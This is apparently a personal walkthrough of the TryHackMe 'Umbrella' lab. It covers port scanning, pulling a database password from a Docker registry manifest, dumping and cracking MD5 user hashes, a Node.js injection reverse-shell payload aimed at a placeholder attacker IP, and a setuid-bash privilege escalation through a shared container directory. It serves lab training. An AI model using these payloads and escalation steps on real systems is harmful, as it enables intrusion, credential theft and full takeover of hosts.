
# ipaddr `10.10.182.15`

# Date 2 - 05- 24 || Rohit Tiwari

# Nmap scan

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql
5000/tcp open  upnp
8080/tcp open  http-proxy
```

>Then i tried to do full port scan to get more info on ports

```</>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
|_  256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
3306/tcp open  mysql   MySQL 5.7.40
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 7
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, FoundRows, LongPassword, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, ODBCClient, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 528,\x1C)\x17\x0B*a6=:ltN\x1C\x13\x11H
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.40_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-22T10:04:49
| Not valid after:  2032-12-19T10:04:49
| MD5:   c512:bd8c:75b6:afa8:fde3:bc14:0f3e:7764
|_SHA-1: 8f11:0b77:1387:0438:fc69:658a:eb43:1671:715c:d421
5000/tcp open  http    Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

>`My attack plan`
>Try http for cve,vulnerablitty,cred anything that can levarage me to the mysql 

>Have to check port 5000 upnp as am unaware of this service
>Alright so port 5000 is used for looking devices in a network

```
Port 5000 is used for UPnP (**universal plug and play**) which got implemented into mDNSResponder on your Mac. It's used for Bonjour/mDNS to find AirPrint and other resources on your network, typically mDNS runs on port 5353.
```

>on Further investigating found that 5000 is using some docker conf

```<>
nmap -sVC -p 5000 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 17:12 IST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.11.186
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
```
on port 8080 found a page with login form asking for username and password

![](attachments/Pasted%20image%2020240602112418.png)
> Tried fuzzing and enumerating subdomains but found nothing may this login page is vulnerable to sql injection
> The server is not vulnerable to sql injection may be brute force is an option


okay so on port 5000 found DB config

![](attachments/Pasted%20image%2020240602203201.png)

using this got pass
```<>
curl -s   http://10.10.112.105:5000/v2/umbrella/timetracking/manifests/latest | grep "DB_PASS"


DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5
```


```<>
──(dedrknex㉿kali)-[~/oscp/Tryhackme/Umbrealla_10.10.241.107]
└─$ mysql -h 10.10.112.105 -u root -p timetracking              
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 6
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [timetracking]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.151 sec)

MySQL [timetracking]> select * from timetracking;
ERROR 1146 (42S02): Table 'timetracking.timetracking' doesn't exist
MySQL [timetracking]> select * from information_schema;
ERROR 1146 (42S02): Table 'timetracking.information_schema' doesn't exist
MySQL [timetracking]> SELECT * from information_schema;
ERROR 1146 (42S02): Table 'timetracking.information_schema' doesn't exist
MySQL [timetracking]> SELECT * ;
ERROR 1096 (HY000): No tables used
MySQL [timetracking]> SELECT * from timetracking;
ERROR 1146 (42S02): Table 'timetracking.timetracking' doesn't exist
MySQL [timetracking]> use timetracking;
Database changed
MySQL [timetracking]> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.152 sec)

MySQL [timetracking]> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.151 sec)


```

# cracked the passwd
```<>
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Umbrealla_10.10.241.107]
└─$ john clair.txt --format=Raw-Md5  
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Password1        (claire-r)     
1g 0:00:00:00 DONE 2/3 (2024-06-02 20:58) 14.28g/s 202628p/s 202628c/s 202628C/s !@#$%..Skippy
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

# Got SSH
![](attachments/Pasted%20image%2020240602221906.png)


# on reading the content of app.js found somthing

![](attachments/Pasted%20image%2020240603142005.png)

>By using cahtgpt come to an conclusion that if we can control the time param we can get revershell or execute arbitatry code into the system

okay so it worked i used some googling for that 

```<>
lins
https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73


https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/
```


>`payload i used`

```<>
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(RPORT, "Attacker-ip", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
```

![](attachments/Pasted%20image%2020240603143802.png)

>So got root in conatiner

![](attachments/Pasted%20image%2020240603143834.png)

> On docker there's dir as logs which logs everything that user claire-r do so tied creating file in docker and checking it on ssh found the file

![](attachments/Pasted%20image%2020240603145007.png)

![](attachments/Pasted%20image%2020240603145026.png)

```privsec
#attacker machine
root@de0610f51845:/logs# cp /bin/bash gotroot
root@de0610f51845:/logs# l
bash: l: command not found
root@de0610f51845:/logs# ls
gotroot  text.txt  tt.log
root@de0610f51845:/logs# cp /bin/bash shroot
root@de0610f51845:/logs# cp /bin/bash .
root@de0610f51845:/logs# chown root:root gotroot 
root@de0610f51845:/logs# chown root:root bash    
root@de0610f51845:/logs# chmod 4777 gotroot 
root@de0610f51845:/logs# 

#victim ssh machine

./gotroot -p

```

![](attachments/Pasted%20image%2020240603145857.png)

![](attachments/Pasted%20image%2020240603145914.png)

```<>
The command you've provided is used to change the ownership and permissions of the file named "bash". Let's break it down:

chown: This command is used to change the owner and group of a file or directory.

root
: This specifies that you want to change the owner and group of the file to the user "root" and the group "root". This means that the file will be owned by the root user and belong to the root group.

bash: This is the name of the file you want to change the ownership and permissions for. In this case, it's "bash".

chmod: This command is used to change the permissions of a file or directory.

4777: This sets the permissions of the file. In octal notation, the first digit represents the special permissions, and the following three digits represent permissions for the owner, group, and others, respectively.

The first digit "4" sets the setuid bit, which means that when the file is executed, it will run with the permissions of the file owner (in this case, root).
The remaining digits "777" set read, write, and execute permissions for the owner, group, and others.
This command sets the ownership of the "bash" file to root
and sets the permissions to allow anyone to read, write, and execute the file, with the setuid bit set, which allows the file to be executed with the permissions of the owner (root) regardless of who executes it.
```
